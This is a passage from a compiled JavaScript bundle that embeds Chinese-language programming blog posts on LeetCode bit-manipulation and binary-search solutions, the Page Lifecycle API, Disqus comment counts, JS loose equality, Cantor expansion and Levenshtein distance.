----&gt; 0</code></p>\\n<p>b第二步：<code>(b ^ n) &amp; n  ----&gt; 0</code></p>\\n<p>a第二步：<code>(a ^ n) &amp; cov(b,n)  ----&gt; n</code></p>\\n<p>b第三步：<code>(b ^ n) &amp; 0    ----&gt; 0</code></p>\\n<p>a第三步：<code>(a ^ n) &amp; cov(b,n)  ----&gt; 0</code></p>\\n<p>再看b的需要的值<code>n,n,0</code>，a的初始值和前2步的输出值是<code>0,0,n</code>，很上面一样，</p>\\n<p>b第一步：<code>(b ^ n) &amp; cov(a,n)  ----&gt; n</code></p>\\n<p>a第一步：<code>(a ^ n) &amp; cov(b,n)  ----&gt; 0</code></p>\\n<p>b第二步：<code>(b ^ n) &amp; cov(a,n)  ----&gt; 0</code></p>\\n<p>a第二步：<code>(a ^ n) &amp; cov(b,n)  ----&gt; n</code></p>\\n<p>b第三步：<code>(b ^ n) &amp; cov(a,n)  ----&gt; 0</code></p>\\n<p>a第三步：<code>(a ^ n) &amp; cov(b,n)  ----&gt; 0</code></p>\\n<p>5.上面只是实现连续数字，<code>[5,5,5,4]</code>这种</p>\\n<p>但实际上往往是这样的：<code>[5,4,5,5]</code></p>\\n<p>那么<code>cov()</code>是需要写成<code>~</code>，因为<code>n &amp; ~n</code>一定为0，<code>n &amp; ~0</code>一定为n，因此最终为：</p>\\n<p>b第一步：<code>(b ^ n) &amp; ~a  ----&gt; n</code></p>\\n<p>a第一步：<code>(a ^ n) &amp; ~b  ----&gt; 0</code></p>\\n<p>b第二步：<code>(b ^ n) &amp; ~a  ----&gt; 0</code></p>\\n<p>a第二步：<code>(a ^ n) &amp; ~b  ----&gt; n</code></p>\\n<p>b第三步：<code>(b ^ n) &amp; ~a  ----&gt; 0</code></p>\\n<p>a第三步：<code>(a ^ n) &amp; ~b  ----&gt; 0</code></p>\\n<p>都是一样的公式，迭代就行</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-number\\">0</span>,b=<span class=\\"hljs-number\\">0</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> n <span class=\\"hljs-keyword\\">of</span> arr){\\n  b=(b ^ n) &amp; ~a \\n  a=(a ^ n) &amp; ~b\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-05","timeArr":[2018,9,5,0,0,0,0],"title":"记录一道LeetCode 位操作符计算单个数字方法","uuid":"df98df497745a7628226928d1110b2baad0c50cb","summary":"<p><a href=\\"https://leetcode.com/problems/single-number-ii/description/\\">原题目：</a>\\n<code>LeetCode</code>的一个题目，要求算出数组中单独出现的数字</p>\\n<pre class=\\"hljs\\"><code>Given a non-empty array of integers, every element appear...</code></pre>","slug":"ji-lu-yi-dao-LeetCode-wei-cao-zuo-fu-ji-suan-dan-ge-shu-zi-fang-fa","sha":"6a99838485b9fda6b8a6b0e9d892100d68d0a27c"}')},612:function(n){n.exports=JSON.parse('{"content":"<p>题目位置：<a href=\\"https://leetcode.com/problems/nth-magical-number/description/\\">https://leetcode.com/problems/nth-magical-number/description/</a></p>\\n<h5 id=\\"ti-mu\\">题目</h5>\\n<p>如果正整数 可被A  或B整除，则它是神奇的。</p>\\n<p>返回第N个魔法数字。由于答案可能非常大，因此返回值需要模(%)10^9 + 7。</p>\\n<p>例1：</p>\\n<pre><code><pre class=\\"hljs\\"><code>输入： N = 1，A = 2，B = 3\\n输出：2</code></pre></code></pre><p>例2：</p>\\n<pre><code><pre class=\\"hljs\\"><code>输入： N = 4，A = 2，B = 3\\n输出：6</code></pre></code></pre><p>例3：</p>\\n<pre><code><pre class=\\"hljs\\"><code>输入： N = 5，A = 2，B = 4\\n输出：10</code></pre></code></pre><p>例4：</p>\\n<pre><code><pre class=\\"hljs\\"><code>输入： N = 3，A = 6，B = 4\\n输出：8</code></pre></code></pre><hr>\\n<h5 id=\\"yao-dian-；\\">要点；</h5>\\n<ol>\\n<li><p>如果知道在N次内，a出现的次数i，b出现的次数j，那么就可以通过Math.max(a<em>i,b</em>j)求出结果</p>\\n<pre><code><pre class=\\"hljs\\"><code> 例如: N为5, a为3, b为4\\n 如果我们知道a出现了3次，b出现了2次，那么就可算出 9</code></pre></code></pre></li>\\n<li><p>N是由a出现的次数i，b出现的次数j，和他们最小公倍数出现的次数k计算而得(N=i+j-k)</p>\\n<pre><code><pre class=\\"hljs\\"><code> 例如 N为5, a为2, b为3\\n a出现4次，b出现2次，最小公倍数出现1次，那么N=4+2-1</code></pre></code></pre></li>\\n<li><p>假设某个数x，a出现的次数是Math.floor(x/a)，b出现的次数是Math.floor(x/b)，最小公倍数出现的次数是Math.floor(x/lcm)，因此我们要找出这个数，使得i+j-k===N</p>\\n</li>\\n</ol>\\n<hr>\\n<h5 id=\\"zui-da-gong-yue-shu--lowest-common-multiple\\">最大公约数 Lowest Common Multiple</h5>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">GCD</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n    <span class=\\"hljs-keyword\\">while</span>(a % b!==<span class=\\"hljs-number\\">0</span>){\\n        <span class=\\"hljs-keyword\\">let</span> temp=a\\n        a=b;\\n        b=temp % b\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> b\\n}</code></pre></code></pre>\\n<h5 id=\\"zui-xiao-gong-bei-shu--greatest-common-divisor\\">最小公倍数 greatest common divisor</h5>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">LCM</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> a*b/GCD(a,b)\\n}</code></pre></code></pre>\\n<hr>\\n<h5 id=\\"wan-zheng-dai-ma\\">完整代码</h5>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n * <span class=\\"hljs-doctag\\">@param <span class=\\"hljs-type\\">{number}</span> <span class=\\"hljs-variable\\">N</span></span>\\n * <span class=\\"hljs-doctag\\">@param <span class=\\"hljs-type\\">{number}</span> <span class=\\"hljs-variable\\">A</span></span>\\n * <span class=\\"hljs-doctag\\">@param <span class=\\"hljs-type\\">{number}</span> <span class=\\"hljs-variable\\">B</span></span>\\n * <span class=\\"hljs-doctag\\">@return <span class=\\"hljs-type\\">{number}</span></span>\\n */</span>\\n<span class=\\"hljs-keyword\\">var</span> nthMagicalNumber = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">N, A, B</span>) </span>{\\n    <span class=\\"hljs-keyword\\">let</span> lo=<span class=\\"hljs-number\\">0</span>,hi=<span class=\\"hljs-built_in\\">Number</span>.MAX_SAFE_INTEGER,m=<span class=\\"hljs-number\\">0</span>;\\n    <span class=\\"hljs-keyword\\">let</span> aCount,bCount;\\n    <span class=\\"hljs-keyword\\">while</span>(lo&lt;hi){\\n        <span class=\\"hljs-keyword\\">let</span> mid=<span class=\\"hljs-built_in\\">Math</span>.floor((lo+hi)/<span class=\\"hljs-number\\">2</span>);\\n        aCount=<span class=\\"hljs-built_in\\">Math</span>.floor(mid/A);\\n        bCount=<span class=\\"hljs-built_in\\">Math</span>.floor(mid/B);\\n        <span class=\\"hljs-keyword\\">let</span> LCMCount=<span class=\\"hljs-built_in\\">Math</span>.floor(mid/LCM(A,B));\\n        m=aCount+bCount-LCMCount;\\n        <span class=\\"hljs-keyword\\">if</span>(m===N)<span class=\\"hljs-keyword\\">break</span>;\\n        <span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span>(m&gt;N)hi=mid;\\n        <span class=\\"hljs-keyword\\">else</span> lo=mid+<span class=\\"hljs-number\\">1</span>;\\n    }\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">GCD</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n        <span class=\\"hljs-keyword\\">while</span>(a % b!==<span class=\\"hljs-number\\">0</span>){\\n            <span class=\\"hljs-keyword\\">let</span> temp=a;\\n            a=b;\\n            b=temp % b\\n        }\\n        <span class=\\"hljs-keyword\\">return</span> b\\n    }\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">LCM</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n        <span class=\\"hljs-keyword\\">return</span> a*b/GCD(a,b)\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-built_in\\">Math</span>.max(A*aCount,B*bCount) % <span class=\\"hljs-number\\">1000000007</span>\\n};</code></pre></code></pre>\\n","toc":[{"anchor":"ti-mu","level":5,"text":"题目"},{"anchor":"yao-dian-；","level":5,"text":"要点；"},{"anchor":"zui-da-gong-yue-shu--lowest-common-multiple","level":5,"text":"最大公约数 Lowest Common Multiple"},{"anchor":"zui-xiao-gong-bei-shu--greatest-common-divisor","level":5,"text":"最小公倍数 greatest common divisor"},{"anchor":"wan-zheng-dai-ma","level":5,"text":"完整代码"}],"relatedTags":null,"created_at":"2018-07-29","timeArr":[2018,6,29,0,0,0,0],"title":"记一道二分查找算法题","uuid":"00c5d9ed2847e38150e59f8030c9eff752b313f7","summary":"<p>题目位置：https://leetcode.com/problems/nth-magical-number/description/</p>\\n<h5>题目：</h5>\\n<p>如果正整数 可被A  或B整除，则它是神奇的。</p>\\n<p>返回第N个魔法数字。由于答案可能非常大，因此返回值需要模(%)10^9 + 7。</p>\\n<p>例1：</p>\\n<pre class=\\"hljs\\"><code>输入： N ...</code></pre>","slug":"ji-yi-dao-er-fen-cha-zhao-suan-fa-ti","sha":"dfdf8e089072d006549cc430c7b7973cc851fcbb"}')},613:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"jian-ting-wang-ye-du-qu-zhuang-kuang-shi-yong\\">监听网页读取状况使用</h4>\\n<p><code>DOMContentLoaded</code>和<code>window.onload</code></p>\\n<p>监听网页展示状况，可以调用一系列<code>Page LIfecycle</code>API</p>\\n<h4 id=\\"sheng-ming-zhou-qi\\">生命周期</h4>\\n<p><img src=\\"https://raw.githubusercontent.com/WICG/page-lifecycle/master/LifecycleStates.png\\" alt=\\"\\"></p>\\n<ul>\\n<li><code>Active</code>：网页可见并且接受输入，例如滚动，键入字符</li>\\n<li><code>Passive</code>：网页可见并且不接受输入，UI执行，例如正在console平台键入</li>\\n<li><code>Hidden</code>：网页不可见，UI不执行</li>\\n<li><code>Terminated</code>：用户主动关闭页面，也有可能从Frozen状态直接结束。</li>\\n<li><code>Frozen</code>：用户未关闭页面，页面长时间未使用被冻结，网页不会再被分配 CPU 计算资源(小部分任务继续运行)。</li>\\n<li><code>Discarded</code>：网页长时间冻结，卸载网页，清除占用内存，再次进入会重新加载。(当tab过多，容易出现这种情况)</li>\\n</ul>\\n<h4 id=\\"shi-jian\\">事件</h4>\\n<ul>\\n<li><p>focus </p>\\n</li>\\n<li><p>blur</p>\\n</li>\\n<li><p>visibilitychange : 当页面可见状态发生变化，例如，最小化，切换tab，关闭tab等</p>\\n</li>\\n<li><p>freeze : chrome 68新增，当页面转为<code>Frozen</code>时触发。</p>\\n</li>\\n<li><p>resume : chrome 68新增，当页面离开<code>Frozen</code>并且不是关闭时触发。</p>\\n</li>\\n<li><p>pageshow </p>\\n<blockquote>\\n<p><code>pageshow</code>事件在用户加载网页时触发。这时，有可能是全新的页面加载，也可能是从缓存中获取的页面。\\n  如果是从缓存中获取，则该事件对象的<code>event.persisted</code>属性为true，否则为false。</p>\\n</blockquote>\\n<blockquote>\\n<p>这个事件的名字有点误导，它跟页面的可见性其实毫无关系，只跟浏览器的 History 记录的变化有关。</p>\\n</blockquote>\\n</li>\\n<li><p>pagehide</p>\\n<blockquote>\\n<p><code>pagehide</code>事件在用户离开当前网页、进入另一个网页时触发。它的前提是浏览器的 History 记录必须发生变化，跟网页是否可见无关。</p>\\n</blockquote>\\n<blockquote>\\n<p>如果浏览器能够将当前页面添加到缓存以供稍后重用，则事件对象的<code>event.persisted</code>属性为true。 如果为true。如果页面添加到了缓存，则页面进入 Frozen 状态，否则进入 Terminatied 状态。</p>\\n</blockquote>\\n</li>\\n<li><p>unload</p>\\n</li>\\n<li><p>beforeunload : 通过设置<code>event.returnValue</code>在退出网页时提示。</p>\\n</li>\\n</ul>\\n<h4 id=\\"shu-xing\\">属性</h4>\\n<p><code>document.visibilityState</code>：获取当前页面可见状态<code>visible</code>,<code>hidden</code>。\\n<code>document.wasDiscarded</code>：判断网页是否经过<code>Discarded</code>阶段。</p>\\n<hr>\\n<p>demo:<a href=\\"https://page-lifecycle.glitch.me/\\">https://page-lifecycle.glitch.me/</a></p>\\n<p>参考：</p>\\n<ul>\\n<li><a href=\\"http://www.ruanyifeng.com/blog/2018/11/page_lifecycle_api.html\\">Page Lifecycle API 教程</a></li>\\n<li><a href=\\"https://github.com/WICG/page-lifecycle\\">page lifecycle</a></li>\\n</ul>\\n","toc":[{"anchor":"jian-ting-wang-ye-du-qu-zhuang-kuang-shi-yong","level":4,"text":"监听网页读取状况使用"},{"anchor":"sheng-ming-zhou-qi","level":4,"text":"生命周期"},{"anchor":"shi-jian","level":4,"text":"事件"},{"anchor":"shu-xing","level":4,"text":"属性"}],"relatedTags":null,"created_at":"2018-11-07","timeArr":[2018,10,7,0,0,0,0],"title":"监控网页状态的-Page Lifecycle","uuid":"dc88a14e3350748449cfa7bae96179c2301f3548","summary":"<h4>监听网页读取状况使用</h4>\\n<p><code>DOMContentLoaded</code>和<code>window.onload</code></p>\\n<p>监听网页展示状况，可以调用一系列<code>Page LIfecycle</code>API</p>\\n<h4>生命周期：</h4>\\n<p>![](https://raw.githubusercontent.com/WICG/page-lifecycle/m...</p>","slug":"jian-kong-wang-ye-zhuang-tai-de-Page-Lifecycle","sha":"ce6d06466d2502c0c7cc081e44839f05bad8e8b0"}')},614:function(n){n.exports=JSON.parse('{"content":"<p>博客添加了<code>disqus</code>，并且在文章列表处每一篇标题边上添加一个评论计数器。</p>\\n<p>它通过<code>identifier</code>去获取，<code>identifier</code>在文章详情页面提供配置。</p>\\n<p>问题是：<strong>这个计数器并不是每一篇文章都能正确显示</strong>，有的列表能显示2个，有的列表一个都不显示，</p>\\n<p><img src=\\"/article/img/comment_count_fail.png\\" alt=\\"\\"></p>\\n<p>看了看network，不能显示的文章response是个空数组，是不是服务器获取失败呢还是没有上传到服务器呢。</p>\\n<p>第一次尝试，将计数器获取的配置<code>identifier</code>改成一个静态的并且有效的(已经能获取到的)，\\n结果能显示，说明获取计数值这个调用(或者说这个写法)是没有问题的。</p>\\n<p>第二次尝试，将配置<code>identifier</code>改回动态。在<code>https://disqus.com/api/console/</code>进行调试</p>\\n<p>选择<code>thread</code>下方的<code>list</code>，设定<code>froum</code>为你的<code>shortname</code>，\\n如果你的数量超过25，需要设置<code>limit</code>，我这里设置了<code>limit</code>为100</p>\\n<p><img src=\\"/article/img/disqus_concole.png\\" alt=\\"\\"></p>\\n<p>将结果copy到控制台上一看，才47条，我这里文章起码90篇，找到原因了，原来是服务器并未接收到许多文章的<code>identifier</code></p>\\n<p><img src=\\"/article/img/disque_request_first.png\\" alt=\\"\\"></p>\\n<p>那么发生这种问题的原因和问题该如何解决呢？</p>\\n<p>原因应该是，</p>\\n<ol>\\n<li><p>具体的<code>identifier</code>配置卸载模块内部，如果不去加载模块，那么它变无法执行。</p>\\n</li>\\n<li><p>我的文章都是<code>lazy-load</code>或许也有造成这种问题的因素。</p>\\n</li>\\n</ol>\\n<p>那么解决方法，我也是用一个笨方法，写了一个<code>setInterval</code>，每个几秒让它跳转下一篇文章，全部让它配置一次，\\n大约5分钟后，再次<code>request</code>后</p>\\n<p>数量已经达到正常的98</p>\\n<p><img src=\\"/article/img/disque_request_second.png\\" alt=\\"\\"></p>\\n<p>过了几分钟，强制刷新后，再次查看，全部正常显示！</p>\\n<p><img src=\\"/article/img/comment_count_succ.png\\" alt=\\"\\"></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-27","timeArr":[2018,9,27,0,0,0,0],"title":"解决disqus无法正确显示每一个comment count","uuid":"7a618f35d69b48cbdbef3e7285fffc03098e720a","summary":"<p>博客添加了<code>disqus</code>，并且在文章列表处每一篇标题边上添加一个评论计数器。</p>\\n<p>它通过<code>identifier</code>去获取，<code>identifier</code>在文章详情页面提供配置。</p>\\n<p>问题是：<strong>这个计数器并不是每一篇文章都能正确显示</strong>，有的列表能显示2个，有的列表一个都不显示，</p>\\n<p>![](/article/img/commen...</p>","slug":"jie-jue-disqus-wu-fa-zheng-que-xian-shi-mei-yi-ge-comment-count","sha":"901e43a8e9f1c5cf70956f7fb9139ccb541370fd"}')},615:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"js-kuan-song-bi-jiao-==-gui-fan\\">JS宽松比较(==)规范</h2>\\n<p>摘自《你不知道的javascript》</p>\\n<ol>\\n<li><p>字符串和数字之间的相等比较</p>\\n<blockquote>\\n<p>ES5 规范 11.9.3.4-5 这样定义：</p>\\n<ol>\\n<li>如果 Type(x) 是数字， Type(y) 是字符串，则返回 x == ToNumber(y)\\n的结果。</li>\\n<li>如果 Type(x) 是字符串， Type(y) 是数字，则返回 ToNumber(x) == y\\n的结果。</li>\\n</ol>\\n</blockquote>\\n<p> 例如：<code>&quot;&quot; == 0; // true</code></p>\\n</li>\\n<li><p>其他类型和布尔类型之间的相等比较</p>\\n<blockquote>\\n<p>规范 11.9.3.6-7 是这样说的：</p>\\n<ol>\\n<li>如果 Type(x) 是布尔类型，则返回 ToNumber(x) == y 的结果；</li>\\n<li>如果 Type(y) 是布尔类型，则返回 x == ToNumber(y) 的结果。</li>\\n</ol>\\n</blockquote>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  [] === <span class=\\"hljs-literal\\">true</span>;    <span class=\\"hljs-comment\\">// false</span>\\n  [] == <span class=\\"hljs-literal\\">true</span>;     <span class=\\"hljs-comment\\">// false</span>\\n  !![];            <span class=\\"hljs-comment\\">// true</span>\\n  <span class=\\"hljs-string\\">\\"42\\"</span> == <span class=\\"hljs-literal\\">true</span>;   <span class=\\"hljs-comment\\">// false</span>\\n  <span class=\\"hljs-literal\\">false</span> == <span class=\\"hljs-string\\">\\"\\"</span>;    <span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n</li>\\n<li><p>null 和 undefined 之间的相等比较</p>\\n<blockquote>\\n<p>ES5 规范 11.9.3.2-3 规定：</p>\\n<ol>\\n<li>如果 x 为 null ， y 为 undefined ，则结果为 true 。</li>\\n<li>如果 x 为 undefined ， y 为 null ，则结果为 true 。</li>\\n</ol>\\n</blockquote>\\n</li>\\n<li><p>对象和非对象之间的相等比较</p>\\n<blockquote>\\n<p>ES5 规范 11.9.3.8-9 做如下规定：</p>\\n<ol>\\n<li>如果 Type(x) 是字符串或数字， Type(y) 是对象，则返回 x == ToPrimitive(y)\\n的结果；</li>\\n<li>如果 Type(x) 是对象， Type(y) 是字符串或数字，则返回 ToPromitive(x) == y\\n的结果。</li>\\n</ol>\\n</blockquote>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> [<span class=\\"hljs-number\\">42</span>] == <span class=\\"hljs-number\\">42</span>;  <span class=\\"hljs-comment\\">// true</span>\\n [] == <span class=\\"hljs-string\\">\\"\\"</span>;    <span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n<p> <code>ToPromitive</code>：尝试转换为原始值</p>\\n<p> 比较规则：先使用<code>valueOf</code>，如果不是原始值，则使用<code>toString</code>，如果还不是，则抛出错误。</p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"js-kuan-song-bi-jiao-==-gui-fan","level":2,"text":"JS宽松比较(==)规范"}],"relatedTags":null,"created_at":"2018-07-10","timeArr":[2018,6,10,0,0,0,0],"title":"js宽松比较规范","uuid":"a0f124d6d5ccb06205fe4c0fcfcff8dd9fb16d44","summary":"<p>ES5 规范 11.9.3.4-5 这样定义：</p>\\n<ol>\\n<li>如果 Type(x) 是数字， Type(y) 是字符串，则返回 x == ToNumber(y)\\n的结果。</li>\\n<li>如果 Type(x) 是字符串， Type(y) 是数字，则返回 ToNumber(x) == y\\n的结果。</li>\\n</ol>","slug":"js-kuan-song-bi-jiao-gui-fan","sha":"df2e9c8633809f2f352ba06bdcde43a83ec1b3b4"}')},616:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li><p>康拓展开</p>\\n<p>  例如，<code>2431</code>有多少种排列方式会比它小的，那么我们的计算方式是：</p>\\n<p>  <code>1 * 3! + 2 * 2! + 1 * 1! + 0 * 0! = 11</code></p>\\n<p>  解释：</p>\\n<p>  第一个数<code>2</code>，比它小的有1个，后续能排列数量有<code>3!</code></p>\\n<p>  第二个数<code>4</code>，减去它之前的<code>2</code>，比它小的还有2个，后续能排列数量有<code>2!</code></p>\\n<p>  第三个数<code>3</code>，减去它之前的<code>2</code>，比它小的还有1个，后续能排列数量有<code>1!</code></p>\\n<p>  ...</p>\\n</li>\\n<li><p>康拓逆展开</p>\\n<p>  例如 <code>n=4, k=12</code></p>\\n<p>  那么首先前面有<code>k-1=11</code>个排序是比当前小的。</p>\\n<p>  第一个数字，<code>11 除以 3!</code>，结果为<code>1</code>余<code>5</code>，说明有1个比它小，因此第一个数字是<code>2</code>；</p>\\n<p>  第二个数字，<code>5 除以 2!</code>，结果为<code>2</code>余<code>1</code>，说明有2个比它小，因为上面<code>2</code>已经使用了，因此这里是<code>4</code>；</p>\\n<p>  第三个数字，<code>1 除以 1!</code>，结果为<code>1</code>余<code>0</code>，说明有1个比它小，上面<code>2</code>已经使用了，因此这里是<code>3</code>；</p>\\n<p>  第四个数字，<code>0 除以 0!</code>，<code>0</code>为分母无法计算，这里是最后一个数字<code>1</code>。</p>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2019-03-29","timeArr":[2019,2,29,0,0,0,0],"title":"康拓展开算法","uuid":"25190dd0cd5c8e0af3419567a8b6216802ec408e","summary":"<ul>\\n<li>\\n<p>康拓展开</p>\\n<p>例如，<code>2431</code>有多少种排列方式会比它小的，那么我们的计算方式是：</p>\\n<p><code>1 * 3! + 2 * 2! + 1 * 1! + 0 * 0! = 11</code></p>\\n<p>解释：</p>\\n<p>第一个数<code>2</code>，比它小的有1个，后续能排列数量有<code>3!</code></p>\\n<p>第二个...</p>\\n</li>\\n</ul>","slug":"kang-tuo-zhan-kai-suan-fa","sha":"c0a7f96accec11aab2162dfcb3787daff1b25439"}')},617:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"xue-xi-levenshtein-distance-suan-fa\\">学习Levenshtein Distance算法</h4>\\n<p>  任意单个字符变动有3种情况，替换，增加和删除：</p>\\n<p><strong>1. 如果对应的字符相同，则从它的左，斜或者上方选取最小值，直接填写</strong>\\n<strong>2. 如果对应的字符不相同，则从它的左，斜或者上方选取最小值，+1后填写</strong></p>\\n<p>括号内部表示需要进行移动的步数</p>\\n<ul>\\n<li><p>情况一：从ab到ac的变动</p>\\n<p>x位置 字符不相等(b!==c)，但是 i位置变动最小，所以从i位置的数值加1，斜线说明说替换</p>\\n<pre><code><pre class=\\"hljs\\"><code>  a     b\\na i(0) j(1)\\nc l(1)  x\\n// x=1</code></pre></code></pre></li>\\n<li><p>情况二：从acd到ac的变动</p>\\n<p>x位置 字符不相等(b!==c)，但是 m位置变动最小，所以从m位置的数值加1，横向说明增加</p>\\n<pre><code><pre class=\\"hljs\\"><code>  a     c     d\\na i(0)  j(1)  k(2)\\nc l(1)  m(0)  x \\n// x=1</code></pre></code></pre></li>\\n<li><p>情况三：从ab到abc的变动</p>\\n<p>x位置 字符不相等(b!==c)，但是 l位置变动最小，所以从l位置的数值加1，竖向说明减少</p>\\n<pre><code><pre class=\\"hljs\\"><code> a      b\\na i(0)  j(1)\\nb k(1)  l(0)\\nc m(2)  x\\n// x=1</code></pre></code></pre><p>每一次的判断所确定的最小变动数，又是下一次判断变动的基础</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">minED</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 先创建a和b的二维数组（横竖都额外多一行，作为第一个字符比较的基础）</span>\\n  <span class=\\"hljs-keyword\\">let</span> arr=<span class=\\"hljs-built_in\\">Array</span>(b.length+<span class=\\"hljs-number\\">1</span>).fill(<span class=\\"hljs-literal\\">null</span>);\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n    arr[i]=<span class=\\"hljs-built_in\\">Array</span>(a.length+<span class=\\"hljs-number\\">1</span>).fill(<span class=\\"hljs-literal\\">null</span>);\\n    <span class=\\"hljs-keyword\\">if</span>(i===<span class=\\"hljs-number\\">0</span>){\\n      <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=<span class=\\"hljs-number\\">0</span>;j&lt;arr[<span class=\\"hljs-number\\">0</span>].length;j++){arr[<span class=\\"hljs-number\\">0</span>][j]=j;}\\n    }\\n    arr[i][<span class=\\"hljs-number\\">0</span>]=i;\\n  }\\n  <span class=\\"hljs-comment\\">// 对每一个字符进行比较，利用上一次比较的基础</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>;i&lt;arr.length;i++){\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=<span class=\\"hljs-number\\">1</span>;j&lt;arr[i].length;j++){\\n      <span class=\\"hljs-keyword\\">let</span> count=<span class=\\"hljs-number\\">0</span>;\\n      <span class=\\"hljs-keyword\\">if</span>(b[i<span class=\\"hljs-number\\">-1</span>]!==a[j<span class=\\"hljs-number\\">-1</span>]){\\n        count++;\\n      }\\n      arr[i][j]=<span class=\\"hljs-built_in\\">Math</span>.min(arr[i<span class=\\"hljs-number\\">-1</span>][j<span class=\\"hljs-number\\">-1</span>],arr[i<span class=\\"hljs-number\\">-1</span>][j],arr[i][j<span class=\\"hljs-number\\">-1</span>])+count;\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> arr[b.length][a.length]\\n}\\n\\n<span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-string\\">\'abcd\'</span>,b=<span class=\\"hljs-string\\">\\"adbc\\"</span>\\nminED(a,b)</code></pre></code></pre>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-string\\">\'abcd\'</span>,b=<span class=\\"hljs-string\\">\\"adbc\\"</span>\\nminED(a,b)\\n\\n<span class=\\"hljs-comment\\">// 输出数据：</span>\\n[ [ <span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-number\\">4</span> ],\\n  [ <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">3</span> ],\\n  [ <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">2</span> ],\\n  [ <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">3</span> ],\\n  [ <span class=\\"hljs-number\\">4</span>, <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span> ] ]</code></pre></code></pre>\\n<p>因此从&#39;abcd&#39;变动到&#39;adbc&#39;，最小移动步数是2</p>\\n","toc":[{"anchor":"xue-xi-levenshtein-distance-suan-fa","level":4,"text":"学习Levenshtein Distance算法"}],"relatedTags":null,"created_at":"2018-06-18","timeArr":[2018,5,18,0,0,0,0],"title":"两个字符串最小编辑距离算法","uuid":"77f0065531e454cbcc9fad960f3cdbe37d6e2d25","summary":"<h4>学习Levenshtein Distance算法</h4>\\n<p>任意单个字符变动有3种情况，替换，增加和删除：</p>\\n<p><strong>1. 如果对应的字符相同，则从它的左，斜或者上方选取最小值，直接填写</strong>\\n<strong>2. 如果对应的字符不相同，则从它的左，斜或者上方选取最小值，+1后填写</strong></p>\\n<p>括号内部表示需要进行移动的步数</p>\\n<ul>\\n<li>...</li>\\n</ul>","slug":"liang-ge-zi-fu-chuan-zui-xiao-bian-ji-ju-li-suan-fa","sha":"be3a5d23fd6575a2a323c8daa62b9432f71776ec"}')},618:function(n){n.exports=JSON.parse('{"content":"<h3 